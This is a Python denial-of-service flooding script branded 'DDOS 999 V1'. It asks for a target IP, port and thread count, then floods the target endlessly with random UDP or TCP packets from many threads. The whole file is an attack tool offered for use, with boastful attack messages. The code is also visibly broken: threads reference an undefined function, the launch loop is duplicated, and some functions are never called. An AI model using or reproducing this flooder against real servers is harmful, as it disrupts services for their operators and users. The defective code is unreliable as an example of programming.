#!/python3/

import random
import socket
import threading
import time
import os
import codecs
import struct
import sys

os.system("clear")

if not __name__ == "__main__":
    exit()
      
class ConsoleColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    
    
print('''
\033[35m  
\033[35m  
   ____________________
  | KARASKO IS HERE    |
  |____________________|
  KARASKO 3MK A WLD L9HBA
        _________★_★_★______________
         THE BEST DEV IN THE WORLD
         _________★_★_★______________
         
         
                / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
                \___ \| __/ _` | '__| __| | '_ \ / _` |
                 ___) | || (_| | |  | |_| | | | | (_| |
                |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                  |___/ 
                                                      BY 999
                                                             
               § DDOS\033[35m 999 \033[35m 999\033[35m V1\033[35m §
                                               \033[35m TCP/HTTP\033[35m
                                               
         ''')



ip = str(input(" IP HOST :"))
port = int(input(" PORT HOST :"))
choice = str(input(" UDP(Y/N):"))
times = int(input(" PACKETS  CONNECTION:"))
threads = int(input(" THREADS:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

def getport():
    try:
        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
        return p
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
        return 80
      
def run1():
    data = random._urandom(1024)
    i = random.choice(("[*]","[+]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"[#] ATACK ON BY 999 FTW !!!")
        except:
            print("[*] ERROR BY 999 !!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[+]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"[#] SERVER TLA3LO PING B DDOS ATTACK 999 FTW !!!")
        except:
            s.close()
            print("[+] ERROR THE SERVER !!!")

def run3():
    data = random._urandom(594)
    i = random.choice(("[*]","[+]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"[+] 999 ATACKED BY DDOS ATTACK !!!")
        except:
            s.close()
            print("[*] ERROR BY 999 FTW !!!")

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
